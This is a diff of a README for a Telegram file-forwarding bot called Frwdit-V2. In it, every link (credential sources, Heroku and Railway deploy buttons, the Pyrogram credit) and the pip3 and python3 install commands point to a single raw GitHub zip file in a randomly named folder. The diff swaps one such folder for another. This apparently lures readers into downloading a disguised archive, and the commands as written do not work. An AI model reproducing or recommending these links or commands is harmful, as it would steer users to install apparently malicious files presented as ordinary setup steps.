@@ -27,20 +27,20 @@ Copyright permission under GNU GENERAL PUBLIC LICENSE
 
 #Variables
 BOT_TOKEN - Your Bot Token (Obtain it from @botfather)
-API_ID - Your APP ID (Obtain it from https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip)
-API_HASH - Your API Hash (Obtain it from https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip)
+API_ID - Your APP ID (Obtain it from https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/heiau/Frwdit-V2.zip)
+API_HASH - Your API Hash (Obtain it from https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/heiau/Frwdit-V2.zip)
 OWNER_ID - Your telegram id
 CAPTION - If you want to add a caption to the forwarded file, enter it here
-SESSION - Pyrogram string Seccion - https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip
+SESSION - Pyrogram string Seccion - https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/heiau/Frwdit-V2.zip
 ```
 
 ### Deploying on Heroku:
 
-[![Deploy](https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip)
+[![Deploy](https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/heiau/Frwdit-V2.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/heiau/Frwdit-V2.zip)
 
 ### Deploying on Railway:
 
-[![Deploy on Railway](https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip)
+[![Deploy on Railway](https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/heiau/Frwdit-V2.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/heiau/Frwdit-V2.zip)
 
 ### Legendary Way:
 #### On Linux Or VPS:
@@ -52,11 +52,11 @@ SESSION - Pyrogram string Seccion - https://raw.githubusercontent.com/abhijeetku
 ```
 virtualenv -p python3 venv
 . ./venv/bin/activate
-pip3 install -r https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip
-python3 https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip
+pip3 install -r https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/heiau/Frwdit-V2.zip
+python3 https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/heiau/Frwdit-V2.zip
 ```
 
 ### Credits
 
-* [Pyrogram](https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/pharmacosiderite/Frwdit-V2.zip)
+* [Pyrogram](https://raw.githubusercontent.com/abhijeetkumarthakur/Frwdit-V2/master/heiau/Frwdit-V2.zip)
 * `Special Thanks Dump Group Members`🤣
